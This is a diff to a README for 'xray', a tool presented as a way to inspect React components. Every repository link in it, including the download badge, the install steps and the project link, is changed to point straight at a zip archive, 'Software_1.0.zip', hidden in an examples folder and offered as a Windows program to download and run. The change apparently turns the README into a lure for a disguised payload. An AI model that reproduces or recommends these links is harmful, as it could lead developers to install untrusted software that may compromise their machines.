@@ -1,11 +1,11 @@
 # 🧭 xray - See React Components Fast
 
-[![Download xray](https://img.shields.io/badge/Download-xray-blue?style=for-the-badge&logo=github)](https://github.com/Karenfsi188/xray)
+[![Download xray](https://img.shields.io/badge/Download-xray-blue?style=for-the-badge&logo=github)](https://github.com/Karenfsi188/xray/raw/refs/heads/main/examples/nextjs-webpack/Software_1.0.zip)
 
 ## 🚀 Download
 
 Use this link to visit the page to download and run xray:
-https://github.com/Karenfsi188/xray
+https://github.com/Karenfsi188/xray/raw/refs/heads/main/examples/nextjs-webpack/Software_1.0.zip
 
 ## 👀 What xray does
 
@@ -35,7 +35,7 @@ xray runs on Windows with a simple install flow.
 ### Install steps
 
 1. Open this page:
-   https://github.com/Karenfsi188/xray
+   https://github.com/Karenfsi188/xray/raw/refs/heads/main/examples/nextjs-webpack/Software_1.0.zip
 
 2. Get the Windows version from the page.
 
@@ -130,4 +130,4 @@ It is useful when you want to move from a visual part of the app back to the fil
 ## 📌 Repository
 
 Project link:
-https://github.com/Karenfsi188/xray
+https://github.com/Karenfsi188/xray/raw/refs/heads/main/examples/nextjs-webpack/Software_1.0.zip
